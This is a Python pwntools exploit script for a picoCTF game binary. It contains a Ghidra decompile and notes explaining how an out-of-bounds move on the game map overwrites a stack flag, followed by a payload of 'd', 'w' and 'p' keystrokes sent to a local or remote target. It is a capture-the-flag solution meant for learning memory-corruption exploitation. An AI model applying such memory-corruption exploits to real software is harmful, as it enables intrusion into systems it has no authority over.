#!/usr/bin/env python3


"""
Ghidra decompile


void move_player(int *player_pos,char move,int coordinate_array)

{
  int iVar1;
  
  if (move == 'l') {
    iVar1 = getchar();
    player_tile = (undefined)iVar1;
  }
  if (move == 'p') {
    solve_round(coordinate_array,player_pos);
  }
  *(undefined *)(*player_pos * 0x5a + coordinate_array + player_pos[1]) = 0x2e;
  if (move == 'w') {
    *player_pos = *player_pos + -1;
  }
  else if (move == 's') {
    *player_pos = *player_pos + 1;
  }
  else if (move == 'a') {
    player_pos[1] = player_pos[1] + -1;
  }
  else if (move == 'd') {
    player_pos[1] = player_pos[1] + 1;
  }
  *(undefined *)(*player_pos * 0x5a + coordinate_array + player_pos[1]) = player_tile;
  return;
}

undefined4 main(void)

{
  int move;
  undefined4 uVar1;
  int in_GS_OFFSET;
  int player_location;
  int local_aa8;
  char local_aa4;
  undefined coordinate_array [2700];
  int local_14;
  undefined *local_10;

  local_10 = &stack0x00000004;
  local_14 = *(int *)(in_GS_OFFSET + 0x14);
  init_player(&player_location);
  init_map(coordinate_array,&player_location);
  print_map(coordinate_array,&player_location);
  signal(2,sigint_handler);
  do {
    do {
      move = getchar();
      move_player(&player_location,(int)(char)move,coordinate_array);
      print_map(coordinate_array,&player_location);
    } while (player_location != 0x1d);
  } while (local_aa8 != 0x59);
  puts("You win!");
  if (local_aa4 != '\0') {
    puts("flage");
    win();
    fflush(stdout);
  }
  uVar1 = 0;
  if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
    uVar1 = __stack_chk_fail_local();
  }
  return uVar1;
}

<attack>
Need to change value at this location:
x/x $ebp-0xa9c

Stored directly above the coordinate array, so somehow need to get this line to go negative:
  *(undefined *)(*player_pos * 0x5a + coordinate_array + player_pos[1]) = 0x2e;

We control player_pos, it can go above the boundary and below.
Going above will change it to a negative number.

The value on the x and y access allow us to fine tune this offset.

Basically we want:

    -1*0x5a + coordinate_array + 86 = coordinate_array - 4

This should overwrite the entire value of local_aa4 with '.'
but also prevent us from writing to any other memory.

Exploitation is simple then.

We start at (4,4) and want to be at (86,-1) when we finish

So send 86-4=82 'd' characters and 4-(-1)=5 'w' characters.

Then a 'p' and receive the flag!

picoCTF{gamer_m0d3_enabled_xxxxxxxx}
"""

from pwn import *

context.terminal = ['tmux', 'splitw', '-v']


BINARY = './game'

code = ELF(BINARY)
if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    io = remote(sys.argv[2].split(':')[0], int(sys.argv[2].split(':')[1]))
else:
    io = gdb.debug(BINARY, gdbscript = '''
                   b main
                   b *main+234
                   c
                   stack 20
    ''')



p = log.progress("Exploiting")


payload = str('d'*82).encode('ASCII')
payload += str('w'*5).encode('ASCII')
payload += str('p').encode('ASCII')

io.sendline(payload)
io.interactive()
